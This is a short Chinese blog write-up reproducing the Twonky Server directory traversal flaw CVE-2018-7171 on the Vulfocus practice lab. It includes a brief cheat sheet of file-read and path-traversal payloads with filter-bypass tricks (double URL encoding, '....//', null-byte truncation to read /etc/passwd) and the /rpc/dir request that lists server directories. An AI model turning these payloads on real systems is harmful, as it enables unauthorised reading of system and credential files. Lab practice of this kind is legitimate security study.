# 原创
：  【漏洞复现-twonkyserver-目录遍历】vulfocus/twonkyserver-cve_2018_7171

# 【漏洞复现-twonkyserver-目录遍历】vulfocus/twonkyserver-cve_2018_7171

**目录**

[一、靶场环境](#%E4%B8%80%E3%80%81%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83)

[1.1、平台：](#1.1%E3%80%81%E5%B9%B3%E5%8F%B0%EF%BC%9A)

[1.2、知识:](#1.2%E3%80%81%E6%BC%8F%E6%B4%9E%E7%89%88%E6%9C%AC%3A)

[1.3、描述：](#1.3%E3%80%81%E6%8F%8F%E8%BF%B0%EF%BC%9A)

[二、漏洞验证](#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81)

[2.1、分析：](#2.1%E3%80%81%E5%88%86%E6%9E%90%EF%BC%9A)

---


## 一、靶场环境

> 
<h3>1.1、平台：</h3>
[Vulfocus 漏洞威胁分析平台](https://vulfocus.cn/)
123.58.224.8:44884
123.58.224.8:63774
123.58.224.8:29529

 123.58.224.8:29529

 



> 
<h3>1.2、知识:</h3>
1、文件读取（和目录遍历类似）
?url=file:/etc/pass
/fi/?page=C:/xxx
/index.php/?page=shell.php
index.php?path=php://filter/read=convert.base64-encode/resource=xxx.php(base64加密，避免被当成php执行而乱码)
<hr/>
2、跳目录
../上一级
（有时候可能需要考虑绕过过滤）
单次过滤：....//
正则匹配斜杠：..%252f(双重URL编码，因为浏览器会解码一次)
起始路径匹配：起始路径+相对路径结合绕过
后缀检测：空字节绕过（%00截断）../etc/passwd%00.png
……


> 
<h3>1.3、描述：</h3>
LYNX Twonky Server 7.0.11版本至8.5版本中存在目录遍历漏洞。远程攻击者可通过向rpc/set_all发送带有‘..’序列的‘contentbase’参数利用该漏洞分享任意目录的内容


---


---


## 二、漏洞验证

> 
<h3>2.1、分析：</h3>
http://ip:port**/rpc/dir?path=/**

得到flag目录的信息
<pre>010D/tmp</pre>
http://ip:port**/rpc/dir?path=010**<img alt="" height="256" src="https://img-blog.csdnimg.cn/63f2d95b9843488487c70189d3d83d91.png" width="919"/>
 

